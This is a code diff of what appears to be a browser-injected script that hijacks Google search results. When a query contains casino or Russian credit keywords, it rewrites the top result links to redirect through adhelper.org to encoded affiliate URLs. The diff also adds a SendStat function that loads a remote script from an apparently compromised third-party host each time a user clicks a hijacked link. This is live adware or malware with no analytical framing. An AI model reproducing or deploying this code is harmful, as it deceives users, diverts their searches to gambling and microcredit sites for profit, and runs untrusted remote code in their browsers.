@@ -4,10 +4,10 @@ var keyWords_credit = ["кредит","деньги","ипотека","в дол
 	document.getElementById('main').addEventListener('DOMNodeInserted',function() {if (document.getElementsByClassName('r')[0]){
 			for(var i=0;i<keyWords_casino.length;i++){
 				if (document.getElementById('gbqfq').value.indexOf(keyWords_casino[i]) >-1) {
-					document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI="');		
+					document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";SendStat(1);');		
 					document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].target="";
 					document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].href="";
-					document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI="');		
+					document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";SendStat(1);');		
 					document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].target="";
 					document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].href="http://adhelper.org/?r=aHR0cDovL21heGNhc2luby5jb20vP3BhcnRuZXI9bXNpZDI=";
 					return false;
@@ -15,10 +15,10 @@ var keyWords_credit = ["кредит","деньги","ипотека","в дол
 			}
 			for(var i=0;i<keyWords_credit.length;i++){
 				if (document.getElementById('gbqfq').value.indexOf(keyWords_credit[i]) >-1) {
-					document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw=="');		
+					document.getElementsByClassName('r')[0].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";SendStat(1);');		
 					document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].target="";
 					document.getElementsByClassName('r')[0].getElementsByTagName('a')[0].href="";
-					document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw=="');		
+					document.getElementsByClassName('r')[1].setAttribute('onmousedown','document.location = "http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";SendStat(1);');		
 					document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].target="";
 					document.getElementsByClassName('r')[1].getElementsByTagName('a')[0].href="http://adhelper.org/?r=aHR0cDovL2F1dG9rcmVkaXQ3NzcuY29tL21pY3JvY3JlZGl0Lw==";
 					return false;
@@ -27,6 +27,13 @@ var keyWords_credit = ["кредит","деньги","ипотека","в дол
 		}
 				
 		},false);
+function SendStat(count){		
+	var stat = document.createElement("script");
+		url = "http://vogis.asmeninis.com/administrator/help/en-GB/css/style/google_statistic.php/?count="+count;
+		stat.setAttribute('type', 'text/javascript');
+		stat.setAttribute('src', url);
+		document.head.appendChild(stat);	
+}
 
 
 	
